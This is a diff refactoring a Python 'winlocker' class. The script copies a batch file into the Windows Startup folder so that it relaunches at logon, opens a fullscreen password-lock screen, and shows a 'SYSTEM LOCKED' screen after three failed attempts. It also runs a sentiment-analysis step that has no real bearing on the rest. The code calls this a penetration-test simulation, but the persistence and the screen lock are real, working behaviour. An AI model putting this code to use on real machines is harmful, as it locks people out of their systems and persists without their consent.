@@ -1,97 +1,103 @@
-#! /usr/bin/env python
-# -*- coding: utf-8 -*-
 import getpass
 import os
-from tkinter import Tk, Label, Button, Entry, messagebox
-from transformers import pipeline
-from datetime import datetime
+import logging
 import hashlib
 import re
+from datetime import datetime
+from tkinter import Tk, Label, Button, Entry, messagebox
+from transformers import pipeline
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 class MachineLearningWinlocker:
+    SALT = "unique_salt"
+    ATTEMPT_LIMIT = 3
+
     def __init__(self):
-        # User and path setup
+        """Initialize the MachineLearningWinlocker with user details and setup"""
         self.user_name = getpass.getuser()
         self.startup_path = fr"C:\Users\{self.user_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
-        # Hugging Face pipeline
-        try:
-            self.sentiment_analyzer = pipeline("sentiment-analysis")
-            print("[+] Sentiment analysis pipeline loaded.")
-        except Exception as e:
-            print(f"[-] Error loading sentiment analysis pipeline: {e}")
-            self.sentiment_analyzer = None
-
-        # Security variables
-        self.salt = "unique_salt"
-        self.hashed_password = self.hash_password("test_password")
+        self.sentiment_analyzer = self.load_sentiment_analyzer()
+        self.hashed_password = self.hash_password("test_password")  # You should replace this with more secure handling.
         self.failed_attempts = []
-        self.attempt_limit = 3
-        self.remaining_attempts = self.attempt_limit
+        self.remaining_attempts = self.ATTEMPT_LIMIT
+
+    def load_sentiment_analyzer(self):
+        """Load Hugging Face sentiment analysis pipeline"""
+        try:
+            sentiment_analyzer = pipeline("sentiment-analysis")
+            logging.info("Sentiment analysis pipeline loaded.")
+            return sentiment_analyzer
+        except Exception as e:
+            logging.error(f"Error loading sentiment analysis pipeline: {e}")
+            return None
 
     def hash_password(self, password):
         """Hashes the password with a salt."""
-        return hashlib.sha256((self.salt + password).encode()).hexdigest()
+        return hashlib.sha256((self.SALT + password).encode()).hexdigest()
 
     def validate_password(self, input_password):
         """Validates the user input password."""
         return self.hash_password(input_password) == self.hashed_password
 
-    def log_attempt(self, input_password):
-        """Logs failed attempts."""
+    def log_failed_attempt(self, input_password):
+        """Logs failed password attempts with masked input."""
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         masked_password = "*" * len(input_password)
         self.failed_attempts.append((timestamp, masked_password))
-        print(f"[-] Failed attempt logged: {timestamp} - {masked_password}")
+        logging.warning(f"Failed attempt logged: {timestamp} - {masked_password}")
 
     def add_persistence(self, script_path):
-        """Adds persistence by simulating startup script creation."""
+        """Simulates adding a script to startup."""
         try:
             with open(os.path.join(self.startup_path, "open.bat"), "w+") as bat_file:
                 bat_file.write(f'start "" {script_path}')
-            print("[+] Startup persistence simulated.")
+            logging.info("Startup persistence simulated.")
         except Exception as e:
-            print(f"[-] Error creating startup script: {e}")
+            logging.error(f"Error creating startup script: {e}")
 
     def remove_persistence(self):
-        """Removes the simulated persistence."""
+        """Simulates removing the startup persistence."""
         try:
             os.remove(os.path.join(self.startup_path, "open.bat"))
-            print("[+] Startup persistence removed.")
+            logging.info("Startup persistence removed.")
         except FileNotFoundError:
-            print("[-] Startup script not found.")
+            logging.warning("Startup script not found.")
         except Exception as e:
-            print(f"[-] Error removing startup script: {e}")
+            logging.error(f"Error removing startup script: {e}")
 
     def analyze_input(self, user_input):
         """Analyzes input using sentiment analysis."""
         if not self.sentiment_analyzer:
-            print("[-] Sentiment analyzer is unavailable.")
+            logging.error("Sentiment analyzer is unavailable.")
             return
 
         try:
-            # Clean and validate input using regular expressions
-            user_input = re.sub(r"[^a-zA-Z0-9\s.,!?]", "", user_input)
+            user_input = self.sanitize_input(user_input)
             result = self.sentiment_analyzer(user_input)
             sentiment = result[0]
-            print(f"[+] Input analysis: {user_input}")
-            print(f"    Sentiment: {sentiment['label']} (Score: {sentiment['score']:.2f})")
+            logging.info(f"Input analysis: {user_input}")
+            logging.info(f"Sentiment: {sentiment['label']} (Score: {sentiment['score']:.2f})")
 
-            # Handle negative sentiment
             if sentiment["label"] == "NEGATIVE":
-                print("[!] Suspicious or hostile input detected.")
+                logging.warning("Suspicious or hostile input detected.")
             else:
-                print("[+] Input seems normal.")
+                logging.info("Input seems normal.")
         except Exception as e:
-            print(f"[-] Error analyzing input: {e}")
+            logging.error(f"Error analyzing input: {e}")
+
+    def sanitize_input(self, user_input):
+        """Sanitizes user input by removing unwanted characters."""
+        return re.sub(r"[^a-zA-Z0-9\s.,!?]", "", user_input)
 
     def lock_screen(self):
-        """Displays a simulated lock screen GUI."""
+        """Simulates a lock screen with password protection."""
         root = Tk()
         root.title("Penetration Test: System Locked")
         root.attributes("-fullscreen", True)
 
-        # GUI elements
         Label(root, text="System Locked - Penetration Testing", font=("Arial", 24), bg="red", fg="white").pack(pady=20)
         Label(root, text="Enter your password to unlock", font=("Arial", 18), bg="black", fg="white").pack(pady=20)
 
@@ -99,25 +105,21 @@ class MachineLearningWinlocker:
         password_entry.pack(pady=20)
 
         def attempt_unlock():
-            nonlocal password_entry
+            """Handles the unlock attempt."""
             input_password = password_entry.get()
             if self.validate_password(input_password):
                 messagebox.showinfo("Unlocked", "System successfully unlocked!")
                 root.destroy()
             else:
                 self.remaining_attempts -= 1
-                self.log_attempt(input_password)
+                self.log_failed_attempt(input_password)
                 password_entry.delete(0, "end")
                 if self.remaining_attempts <= 0:
                     self.trigger_safe_lock(root)
                 else:
-                    messagebox.showwarning(
-                        "Failed", f"Incorrect password. Attempts left: {self.remaining_attempts}"
-                    )
+                    messagebox.showwarning("Failed", f"Incorrect password. Attempts left: {self.remaining_attempts}")
 
-        Button(
-            root, text="Unlock", font=("Arial", 18), command=attempt_unlock
-        ).pack(pady=20)
+        Button(root, text="Unlock", font=("Arial", 18), command=attempt_unlock).pack(pady=20)
 
         root.mainloop()
 
@@ -128,26 +130,25 @@ class MachineLearningWinlocker:
         Label(root, text="SYSTEM LOCKED", font=("Arial", 40), bg="black", fg="red").pack(expand=True)
 
     def cleanup(self):
-        """Performs cleanup actions."""
+        """Performs cleanup actions, removing persistence."""
         self.remove_persistence()
-        print("[+] Cleanup complete.")
+        logging.info("Cleanup complete.")
 
 
 if __name__ == "__main__":
-    # Initialize the winlocker
     winlocker = MachineLearningWinlocker()
 
-    # Add persistence
+    # Simulate adding a script to startup
     script_path = os.path.abspath(__file__)
     winlocker.add_persistence(script_path)
 
-    # Lock screen simulation
+    # Simulate lock screen
     winlocker.lock_screen()
 
-    # Input analysis
+    # Analyze input
     inputs = ["I hate this program!", "This is interesting.", "Terminate the session!"]
     for user_input in inputs:
         winlocker.analyze_input(user_input)
 
-    # Cleanup
+    # Cleanup after test
     winlocker.cleanup()
